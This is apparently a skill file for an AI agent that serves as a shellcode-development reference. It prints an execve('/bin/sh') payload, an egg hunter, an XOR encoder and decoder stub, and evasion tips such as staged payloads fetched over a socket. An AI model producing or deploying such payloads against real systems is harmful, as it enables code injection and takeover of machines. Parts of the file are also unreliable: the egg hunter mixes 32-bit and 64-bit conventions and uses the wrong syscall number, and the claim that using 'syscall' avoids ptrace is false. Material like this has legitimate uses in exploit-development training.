---
name: shellcode-dev
description: Position-independent code, egg hunters, syscall-based shellcode.
---

# Shellcode Development

## 1. Principles

- **Position-Independent Code (PIC)**: No fixed addresses, works at any memory location
- **Null-free**: Avoid `\x00` (null bytes terminate strings)
- **Alphanumeric**: Only printable chars if filtered
- **Small**: Smaller shellcode = easier to inject

## 2. Linux x86-64 Syscalls

| Syscall | Number | Registers |
|---------|--------|-----------|
| `read` | 0 | rdi=fd, rsi=buf, rdx=len |
| `write` | 1 | rdi=fd, rsi=buf, rdx=len |
| `execve` | 59 | rdi=filename, rsi=argv, rdx=envp |
| `exit` | 60 | rdi=code |
| `open` | 2 | rdi=filename, rsi=flags, rdx=mode |

## 3. Minimal execve Shellcode

```nasm
; execve("/bin/sh", NULL, NULL)
xor    rsi, rsi           ; rsi = 0 (NULL)
push   rsi                ; null terminator on stack
mov    rax, 0x68732f6e69622f ; "/bin/sh" in reverse
push   rax
mov    rdi, rsp           ; rdi = pointer to "/bin/sh"
xor    rdx, rdx           ; rdx = 0 (NULL)
mov    al, 59             ; syscall number for execve
syscall
```

## 4. Egg Hunter

```nasm
; Search memory for "egg" signature (e.g., 0x50905090)
xor    ecx, ecx
next_page:
or     cx, 0xfff          ; Page size - 1
inc    ecx
push   ecx
mov    al, 62             ; syscall: access
pop    rdi
mov    rsi, rsp
xor    edx, edx
syscall
cmp    al, 0xf2           ; EFAULT = page not mapped
jz     next_page
mov    eax, 0x50905090    ; egg signature
mov    edi, eax
mov    rsi, rcx
repne  scasd              ; search for egg
jmp    rsi                ; jump to shellcode after egg
```

## 5. Encoder/Decoder

### XOR Encoder (bypass null bytes)
```python
def xor_encode(shellcode, key=0x42):
    encoded = bytes([b ^ key for b in shellcode])
    return encoded
```

### Decoder Stub
```nasm
xor    rcx, rcx
decode:
xor    byte [rsi+rcx], 0x42
inc    rcx
cmp    cl, len
jne    decode
```

## 6. Tools

| Tool | Purpose |
|------|---------|
| `pwntools` | `shellcraft` module for generating shellcode |
| `nasm` | Assemble shellcode |
| `xxd` | Inspect hex dumps |
| `msf-nasm_shell` | Interactive assembly |
| `shell-storm.org` | Shellcode database |

## 7. Anti-Analysis Techniques

- **Syscall obfuscation**: Use `syscall` instead of `int 0x80` (avoids ptrace)
- **API hashing**: Hash API names at runtime (djb2, CRC32)
- **Staged payloads**: Stage 1 loads Stage 2 via socket
